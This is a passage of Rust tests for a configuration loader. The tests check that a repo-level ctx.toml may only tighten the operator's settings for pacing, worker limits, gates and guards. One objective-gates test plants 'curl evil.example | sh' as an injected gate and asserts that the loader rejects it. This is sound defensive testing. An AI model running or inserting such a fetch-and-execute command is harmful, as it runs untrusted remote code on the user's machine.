                home: "[pace]\nmax_percent = 70.0\n",
                repo: "[pace]\nmax_percent = 99.9\n",
                want_enabled: true,
                want_max: 70.0,
                want_soft: 80.0,
            },
            // A repo LOWERING the ceiling below the operator's own value
            // must succeed -- this is the legitimate "this repo is
            // expensive, be more careful here" case the fold exists for.
            Case {
                home: "[pace]\nmax_percent = 99.0\n",
                repo: "[pace]\nmax_percent = 60.0\n",
                want_enabled: true,
                want_max: 60.0,
                want_soft: 80.0,
            },
            // Same for soft_percent, and a repo turning pacing back ON
            // against an operator who explicitly disabled it -- narrowing
            // is allowed to push stricter than home too, the same "repo may
            // ratchet stricter than the operator configured" rule
            // `policy::resolve` already uses.
            Case {
                home: "[pace]\nenabled = false\nsoft_percent = 90.0\n",
                repo: "[pace]\nenabled = true\nsoft_percent = 50.0\n",
                want_enabled: true,
                want_max: 99.0,
                want_soft: 50.0,
            },
            // No repo layer at all: home's own values, untouched.
            Case {
                home: "[pace]\nmax_percent = 55.0\n",
                repo: "",
                want_enabled: true,
                want_max: 55.0,
                want_soft: 80.0,
            },
        ] {
            let home_dir = tempfile::tempdir().expect("tempdir");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home_dir.path());
            if !case.home.is_empty() {
                std::fs::create_dir_all(home_dir.path().join(".zirv")).expect("mkdir");
                std::fs::write(home_dir.path().join(".zirv/ctx.toml"), case.home).expect("write");
            }
            let repo = tempfile::tempdir().expect("tempdir");
            if !case.repo.is_empty() {
                std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
                std::fs::write(repo.path().join(".zirv/ctx.toml"), case.repo).expect("write");
            }
            let empty = env_map(&[]);
            let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect("a repo narrowing pace.* must not be a load error");
            assert_eq!(
                cfg.pace.enabled, case.want_enabled,
                "home={:?} repo={:?}",
                case.home, case.repo
            );
            assert_eq!(
                cfg.pace.max_percent, case.want_max,
                "home={:?} repo={:?}",
                case.home, case.repo
            );
            assert_eq!(
                cfg.pace.soft_percent, case.want_soft,
                "home={:?} repo={:?}",
                case.home, case.repo
            );
        }
    }

    /// The default, unconfigured behaviour: `advise`, not `deny` -- the
    /// posture change this task exists to make (issue #358 T8).
    #[test]
    fn orchestrator_writes_defaults_to_advise() {
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.supervise.orchestrator_writes,
            OrchestratorWrites::Advise
        );
        assert_eq!(cfg.prompt.orchestrator_writes, OrchestratorWrites::Advise);
    }

    /// A repo `ctx.toml` layer may only narrow this key end to end through
    /// `CtxConfig::load`, mirroring `a_repo_layer_may_only_narrow_pace_
    /// enabled_max_percent_and_soft_percent` above.
    #[test]
    fn a_repo_layer_may_only_narrow_orchestrator_writes() {
        struct Case {
            home: &'static str,
            repo: &'static str,
            want: OrchestratorWrites,
        }
        for case in [
            Case {
                home: "",
                repo: "[supervise]\norchestrator_writes = \"deny\"\n",
                want: OrchestratorWrites::Deny,
            },
            Case {
                home: "[supervise]\norchestrator_writes = \"deny\"\n",
                repo: "[supervise]\norchestrator_writes = \"allow\"\n",
                want: OrchestratorWrites::Deny,
            },
            Case {
                home: "[supervise]\norchestrator_writes = \"allow\"\n",
                repo: "",
                want: OrchestratorWrites::Allow,
            },
        ] {
            let home_dir = tempfile::tempdir().expect("tempdir");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home_dir.path());
            if !case.home.is_empty() {
                std::fs::create_dir_all(home_dir.path().join(".zirv")).expect("mkdir");
                std::fs::write(home_dir.path().join(".zirv/ctx.toml"), case.home).expect("write");
            }
            let repo = tempfile::tempdir().expect("tempdir");
            if !case.repo.is_empty() {
                std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
                std::fs::write(repo.path().join(".zirv/ctx.toml"), case.repo).expect("write");
            }
            let empty = env_map(&[]);
            let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect("a repo narrowing supervise.orchestrator_writes must not be a load error");
            assert_eq!(
                cfg.supervise.orchestrator_writes, case.want,
                "home={:?} repo={:?}",
                case.home, case.repo
            );
        }
    }

    /// `ZIRV_CTX_SUPERVISE_ORCHESTRATOR_WRITES` is the operator's own final
    /// word, same as every other `ENV_MAP` entry -- it wins over both the
    /// home and repo layers regardless of what either says.
    #[test]
    fn orchestrator_writes_env_var_wins_over_both_layers() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[supervise]\norchestrator_writes = \"deny\"\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[supervise]\norchestrator_writes = \"deny\"\n",
        )
        .expect("write");
        let env = env_map(&[("ZIRV_CTX_SUPERVISE_ORCHESTRATOR_WRITES", "allow")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.supervise.orchestrator_writes, OrchestratorWrites::Allow);
    }

    /// Issue #262: the full `CtxConfig::load` integration -- a repo-layer
    /// `worker.max_depth`/`worker.deny_network` may only tighten what the
    /// operator's own `~/.zirv/ctx.toml` allows, never loosen it.
    #[test]
    fn a_repo_layer_may_only_narrow_worker_max_depth_and_deny_network() {
        let home_dir = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home_dir.path());
        std::fs::create_dir_all(home_dir.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home_dir.path().join(".zirv/ctx.toml"),
            "[worker]\nmax_depth = 5\ndeny_network = false\n",
        )
        .expect("write");

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[worker]\nmax_depth = 1\ndeny_network = true\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.worker.max_depth, 1, "a repo may tighten the depth cap");
        assert!(
            cfg.worker.deny_network,
            "a repo may deny network for every worker it hosts"
        );

        // The other direction: a repo trying to WIDEN either key is ignored,
        // not honored -- narrowing works from BOTH layers' own strictness,
        // never just "the repo wins".
        let repo_widen = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo_widen.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo_widen.path().join(".zirv/ctx.toml"),
            "[worker]\nmax_depth = 50\ndeny_network = false\n",
        )
        .expect("write");
        let cfg = CtxConfig::load(repo_widen.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.worker.max_depth, 5,
            "a repo may not raise the depth cap above the operator's own"
        );
        assert!(
            !cfg.worker.deny_network,
            "an operator who left network open is not affected by a repo's own false"
        );
    }

    /// Issue #718: the full `CtxConfig::load` integration -- a repo-layer
    /// `worktree.idle_pool_max`/`worktree.idle_ttl_secs` may only tighten
    /// what the operator's own `~/.zirv/ctx.toml` allows, never loosen it.
    #[test]
    fn a_repo_layer_may_only_narrow_worktree_idle_pool_max_and_idle_ttl_secs() {
        let home_dir = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home_dir.path());
        std::fs::create_dir_all(home_dir.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home_dir.path().join(".zirv/ctx.toml"),
            "[worktree]\nidle_pool_max = 4\nidle_ttl_secs = 3600\n",
        )
        .expect("write");

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[worktree]\nidle_pool_max = 1\nidle_ttl_secs = 60\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.worktree.idle_pool_max, 1, "a repo may shrink the pool");
        assert_eq!(cfg.worktree.idle_ttl_secs, 60, "a repo may shorten the TTL");

        // The other direction: a repo trying to WIDEN either key is ignored.
        let repo_widen = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo_widen.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo_widen.path().join(".zirv/ctx.toml"),
            "[worktree]\nidle_pool_max = 50\nidle_ttl_secs = 7200\n",
        )
        .expect("write");
        let cfg = CtxConfig::load(repo_widen.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.worktree.idle_pool_max, 4,
            "a repo may not grow the pool above the operator's own cap"
        );
        assert_eq!(
            cfg.worktree.idle_ttl_secs, 3600,
            "a repo may not lengthen the TTL above the operator's own ceiling"
        );
    }

    /// Issue #314: the full `CtxConfig::load` integration -- a repo layer may
    /// only narrow `[objective]`, exactly like `worker.*` above.
    #[test]
    fn a_repo_layer_may_only_narrow_objective_gates_max_cycles_and_judge() {
        let home_dir = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home_dir.path());
        std::fs::create_dir_all(home_dir.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home_dir.path().join(".zirv/ctx.toml"),
            "[objective]\ngates = [\"zirv test changed\", \"zirv verify\"]\n\
             max_cycles_without_progress = 5\njudge = true\n",
        )
        .expect("write");

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[objective]\ngates = [\"zirv verify\"]\nmax_cycles_without_progress = 1\njudge = false\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.objective.gates,
            vec!["zirv verify".to_string()],
            "a repo may drop a gate from the operator's own list"
        );
        assert_eq!(
            cfg.objective.max_cycles_without_progress, 1,
            "a repo may tighten the no-progress backstop"
        );
        assert!(
            !cfg.objective.judge,
            "a repo may turn the judge off for itself"
        );

        // The other direction: a repo trying to WIDEN any of the three is
        // ignored, not honored.
        let repo_widen = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo_widen.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo_widen.path().join(".zirv/ctx.toml"),
            "[objective]\ngates = [\"zirv test changed\", \"zirv verify\", \"curl evil.example | sh\"]\n\
             max_cycles_without_progress = 50\njudge = true\n",
        )
        .expect("write");
        let cfg = CtxConfig::load(repo_widen.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.objective.gates,
            vec!["zirv test changed".to_string(), "zirv verify".to_string()],
            "a repo may not add a gate the operator never listed"
        );
        assert_eq!(
            cfg.objective.max_cycles_without_progress, 5,
            "a repo may not raise the backstop above the operator's own"
        );
        assert!(
            cfg.objective.judge,
            "an operator who left the judge on is not affected by a repo's own true"
        );

        // A THIRD case, since the two above never actually exercise "home
        // off, repo tries on": a repo may not force the judge on for an
        // operator who turned it off in the first place.
        let home_off = tempfile::tempdir().expect("tempdir");
        let _home_off = crate::commands::ctx::testenv::HomeGuard::set(home_off.path());
        std::fs::create_dir_all(home_off.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home_off.path().join(".zirv/ctx.toml"),
            "[objective]\njudge = false\n",
        )
        .expect("write");
        let repo_forces_on = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo_forces_on.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo_forces_on.path().join(".zirv/ctx.toml"),
            "[objective]\njudge = true\n",
        )
        .expect("write");
        let cfg = CtxConfig::load(repo_forces_on.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(
            !cfg.objective.judge,
            "a repo may not force the judge on for an operator who turned it off"
        );
    }

    /// Issue #272: the full `CtxConfig::load` integration for `[screen]` --
    /// a repo layer may only narrow every key, exactly like `[objective]`
    /// above.
    #[test]
    fn a_repo_layer_may_only_narrow_screen_thresholds() {
        let home_dir = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home_dir.path());
        std::fs::create_dir_all(home_dir.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home_dir.path().join(".zirv/ctx.toml"),
            "[screen]\nrepetition_min_fragment = 400\nrepetition_window = 60\n\
             repetition_min_repeats = 5\nrepetition_dominance_pct = 0.5\n",
        )
        .expect("write");

        let repo_narrows = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo_narrows.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo_narrows.path().join(".zirv/ctx.toml"),
            "[screen]\nrepetition_min_fragment = 100\nrepetition_window = 20\n\
             repetition_min_repeats = 2\nrepetition_dominance_pct = 0.2\n",
        )
        .expect("write");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo_narrows.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.screen.repetition_min_fragment, 100);
        assert_eq!(cfg.screen.repetition_window, 20);
        assert_eq!(cfg.screen.repetition_min_repeats, 2);
        assert_eq!(cfg.screen.repetition_dominance_pct, 0.2);

        let repo_widens = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo_widens.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo_widens.path().join(".zirv/ctx.toml"),
            "[screen]\nrepetition_min_fragment = 40000\nrepetition_window = 6000\n\
             repetition_min_repeats = 500\nrepetition_dominance_pct = 0.99\n",
        )
        .expect("write");
        let cfg = CtxConfig::load(repo_widens.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.screen.repetition_min_fragment, 400,
            "a repo may not raise repetition_min_fragment above the operator's own"
        );
        assert_eq!(cfg.screen.repetition_window, 60);
        assert_eq!(cfg.screen.repetition_min_repeats, 5);
        assert_eq!(cfg.screen.repetition_dominance_pct, 0.5);

        // `ScreenConfig::thresholds` is the one seam into `screen::
        // Thresholds` -- a narrowed config actually reaches it.
        let thresholds = cfg.screen.thresholds();
        assert_eq!(thresholds.repetition_min_fragment, 400);
        assert_eq!(thresholds.repetition_dominance_pct, 0.5);
    }

    /// Issue #262: `worker.default_depth`/`worker.default_read_only` set the
    /// STARTING point a repo could otherwise only narrow away from, so --
    /// unlike `max_depth`/`deny_network` right above -- they are operator-only
    /// outright, the same trust boundary as `workflow.review_worker_budget_
    /// tokens`.
    #[test]
    fn a_repo_layer_may_not_set_worker_default_depth_or_read_only() {
        for (toml, key, escape_hatch) in [
            (
                "[worker]\ndefault_depth = 9\n",
                "worker.default_depth",
                "ZIRV_CTX_WORKER_DEFAULT_DEPTH",
            ),
            (
                "[worker]\ndefault_read_only = true\n",
                "worker.default_read_only",
                "ZIRV_CTX_WORKER_DEFAULT_READ_ONLY",
            ),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");

            let home = tempfile::tempdir().expect("tempdir");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            let empty = env_map(&[]);
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repo may not set its own delegation-envelope starting point")
                .to_string();
            assert!(err.contains(key), "names the offending key: {err}");
            assert!(
                err.contains(escape_hatch),
                "names the operator escape hatch: {err}"
            );
        }
    }

    /// Issue #309: the full `CtxConfig::load` integration -- a repo-layer
    /// `verify_on_stop.enabled = true` must not resurrect a feature the
    /// operator's own `~/.zirv/ctx.toml` turned off, and a repo layer may
    /// still tighten `max_nudges` below the operator's own cap.
    #[test]
    fn a_repo_layer_may_only_narrow_verify_on_stop_enabled_and_max_nudges() {
        let home_dir = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home_dir.path());
        std::fs::create_dir_all(home_dir.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home_dir.path().join(".zirv/ctx.toml"),
            "[verify_on_stop]\nenabled = false\nmax_nudges = 5\n",
        )
        .expect("write");

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[verify_on_stop]\nenabled = true\nmax_nudges = 1\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(
            !cfg.verify_on_stop.enabled,
            "a repo may not re-enable an operator-disabled verify_on_stop"
        );
        assert_eq!(
            cfg.verify_on_stop.max_nudges, 1,
            "a repo may still tighten the nudge cap"
        );
    }

    /// Q1: the full `CtxConfig::load` integration -- the same shape as
    /// `a_repo_layer_may_only_narrow_verify_on_stop_enabled_and_max_nudges`:
    /// a repo-layer `missing_tests_gate.enabled = true` must not resurrect a
    /// check the operator's own `~/.zirv/ctx.toml` turned off, but a repo
    /// layer may still turn an operator-enabled check off for itself.
    #[test]
    fn a_repo_layer_may_only_narrow_missing_tests_gate_enabled() {
        let home_dir = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home_dir.path());
        std::fs::create_dir_all(home_dir.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home_dir.path().join(".zirv/ctx.toml"),
            "[missing_tests_gate]\nenabled = false\n",
        )
        .expect("write");

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[missing_tests_gate]\nenabled = true\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(
            !cfg.missing_tests_gate.enabled,
            "a repo may not re-enable an operator-disabled missing_tests_gate"
        );
    }

    /// Issue #774: identical shape to `a_repo_layer_may_only_narrow_missing_
    /// tests_gate_enabled` -- a repo-layer `subagent_stop_gate.enabled = true`
    /// must not resurrect a gate the operator's own `~/.zirv/ctx.toml` turned
    /// off, but a repo layer may still turn an operator-enabled gate off for
    /// itself.
    #[test]
    fn a_repo_layer_may_only_narrow_subagent_stop_gate_enabled() {
        let home_dir = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home_dir.path());
        std::fs::create_dir_all(home_dir.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home_dir.path().join(".zirv/ctx.toml"),
            "[subagent_stop_gate]\nenabled = false\n",
        )
        .expect("write");

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[subagent_stop_gate]\nenabled = true\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(
            !cfg.subagent_stop_gate.enabled,
            "a repo may not re-enable an operator-disabled subagent_stop_gate"
        );
    }

    /// Identical shape to `a_repo_layer_may_only_narrow_subagent_stop_gate_
    /// enabled` -- a repo-layer `scope_guard.enabled = true` must not
    /// resurrect a guard the operator's own `~/.zirv/ctx.toml` turned off,
    /// but a repo layer may still turn an operator-enabled guard off for
    /// itself.
    #[test]
    fn a_repo_layer_may_only_narrow_scope_guard_enabled() {
        let home_dir = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home_dir.path());
        std::fs::create_dir_all(home_dir.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home_dir.path().join(".zirv/ctx.toml"),
            "[scope_guard]\nenabled = false\n",
        )
        .expect("write");

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[scope_guard]\nenabled = true\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(
            !cfg.scope_guard.enabled,
            "a repo may not re-enable an operator-disabled scope_guard"
        );
    }

    /// The operator environment override wins outright, the same as every
    /// other `ENV_MAP` entry.
    #[test]
    fn scope_guard_env_override_wins_over_a_disabling_home_layer() {
        let home_dir = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home_dir.path());
        std::fs::create_dir_all(home_dir.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home_dir.path().join(".zirv/ctx.toml"),
            "[scope_guard]\nenabled = false\n",
        )
        .expect("write");

        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_SCOPE_GUARD_ENABLED", "true")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(
            cfg.scope_guard.enabled,
            "ZIRV_CTX_SCOPE_GUARD_ENABLED must override the home layer"
        );
    }

    /// `edit_guard` is opt-in: off by default, a repo layer cannot enable it,
    /// and only the operator environment override turns it on.
    #[test]
    fn edit_guard_is_off_by_default_and_a_repo_layer_cannot_enable_it() {
        let home_dir = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home_dir.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[edit_guard]\nenabled = true\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(!cfg.edit_guard.enabled, "a repo may not enable edit_guard");

        let env = env_map(&[("ZIRV_CTX_EDIT_GUARD_ENABLED", "true")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(
            cfg.edit_guard.enabled,
            "the env override enables edit_guard"
        );

        std::fs::create_dir_all(home_dir.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home_dir.path().join(".zirv/ctx.toml"),
            "[edit_guard]\nenabled = true\n",
        )
        .expect("write");

        let bare_repo = tempfile::tempdir().expect("tempdir");
        let cfg = CtxConfig::load(bare_repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(
            cfg.edit_guard.enabled,
            "a home layer enables edit_guard with no repo layer"
        );

        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[edit_guard]\nenabled = false\n",
        )
        .expect("write");
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(
            !cfg.edit_guard.enabled,
            "a repo may disable an operator-enabled edit_guard"
        );
    }

    /// `context.dedupe_native` is deliberately NOT `REPO_FORBIDDEN`, unlike
    /// the byte caps beside it: a repo layer can only ever set it `false`,
    /// which causes MORE context to be injected -- narrowing, the direction
    /// this trust model allows. A repo layer's `true` must not be able to
    /// SUPPRESS an operator's own `false`.
    #[test]
    fn a_repo_layer_may_disable_native_dedupe_but_never_re_enable_it() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv").join(CTX_CONFIG_FILE),
            "[context]\ndedupe_native = false\n",
        )
        .expect("write home layer");

        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv").join(CTX_CONFIG_FILE),
            "[context]\ndedupe_native = true\n",
        )
        .expect("write repo layer");

        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");
        assert!(
            !cfg.context.dedupe_native,
            "the operator's own false must survive a repo layer's true"
        );
    }

    /// Issue #753: `prompt.intake_discipline` is narrow-only from the repo
    /// layer -- a repo `false` turns it off, a repo `true` cannot undo the
    /// operator's own `false`, and neither layer setting it keeps `true`.
    #[test]
    fn a_repo_layer_may_disable_intake_discipline_but_never_re_enable_it() {
        let load = |home_text: Option<&str>, repo_text: &str| {
            let home = tempfile::tempdir().expect("tempdir");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            if let Some(text) = home_text {
                std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
                std::fs::write(home.path().join(".zirv").join(CTX_CONFIG_FILE), text)
                    .expect("write home layer");
            }
            let repo = tempfile::tempdir().expect("repo");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(repo.path().join(".zirv").join(CTX_CONFIG_FILE), repo_text)
                .expect("write repo layer");
            let empty: HashMap<String, String> = HashMap::new();
            CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect("loads")
                .prompt
                .intake_discipline
        };
        assert!(load(None, ""), "default is on");
        assert!(!load(
            None,
            "[prompt]
intake_discipline = false
"
        ));
        assert!(!load(
            Some(
                "[prompt]
intake_discipline = false
"
            ),
            "[prompt]
intake_discipline = true
"
        ));
    }

    /// The default, and the common case: neither layer mentions the key at
    /// all, so it must stay at the built-in `true` -- not fold to `false`
    /// the way an unmodified `narrow_pace_bool` reuse would (its `repo`-
    /// absent case contributes `false`, the wrong polarity for this key).
    #[test]
    fn dedupe_native_defaults_to_true_when_neither_layer_sets_it() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");
        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");
        assert!(cfg.context.dedupe_native);
    }

    /// T9: the operator's own env override is still the final word over
    /// both layers, exactly like every other config key -- narrowing is a
    /// repo-vs-home question only, and env sits above the fold entirely.
    #[test]
    fn env_still_overrides_the_pace_narrowing_fold_outright() {
        let home_dir = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home_dir.path());
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[pace]\nenabled = false\nmax_percent = 10.0\n",
        )
        .expect("write");
        let env = env_map(&[
            ("ZIRV_CTX_PACE", "true"),
            ("ZIRV_CTX_PACE_MAX_PERCENT", "95.0"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(cfg.pace.enabled);
        assert_eq!(cfg.pace.max_percent, 95.0);
    }

    #[test]
    fn env_overrides_use_credits_and_poll() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[
            ("ZIRV_CTX_PACE_USE_CREDITS_CLAUDE", "true"),
            ("ZIRV_CTX_PACE_POLL", "false"),
            ("ZIRV_CTX_PACE_POLL_MIN_INTERVAL_SECS", "120"),
            ("ZIRV_CTX_PACE_SOFT_PERCENT", "70"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(cfg.pace.use_credits.claude);
        assert!(!cfg.pace.use_credits.codex);
        assert!(!cfg.pace.poll_enabled);
        assert_eq!(cfg.pace.poll_min_interval_secs, 120);
        assert_eq!(cfg.pace.soft_percent, 70.0);
    }

    #[test]
    fn the_operator_may_set_review_models_from_home_config_and_env() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[review]\nclaude = \"opus\"\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.review.claude.as_deref(), Some("opus"));
        assert_eq!(cfg.review.codex, None);

        let env = env_map(&[("ZIRV_CTX_REVIEW_MODEL_CODEX", "gpt-5.6-terra")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.review.claude.as_deref(),
            Some("opus"),
            "the home layer still applies under the env layer"
        );
        assert_eq!(cfg.review.codex.as_deref(), Some("gpt-5.6-terra"));
    }

    /// Same trust boundary as `pace.use_credits`/`handoff.model`: a repo
    /// checkout must not be able to pick which model spends the operator's
    /// vendor account running review.
    #[test]
    fn a_repo_layer_may_not_touch_review_model_keys() {
        for toml in [
            "[review]\nclaude = \"opus\"\n",
            "[review]\ncodex = \"gpt-5.6-terra\"\n",
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");

            let home = tempfile::tempdir().expect("tempdir");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            let empty = env_map(&[]);
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repo may not set this key")
                .to_string();
            assert!(err.contains("review"), "names the offending key: {err}");
            assert!(
                err.contains("ZIRV_CTX_REVIEW_MODEL_CLAUDE"),
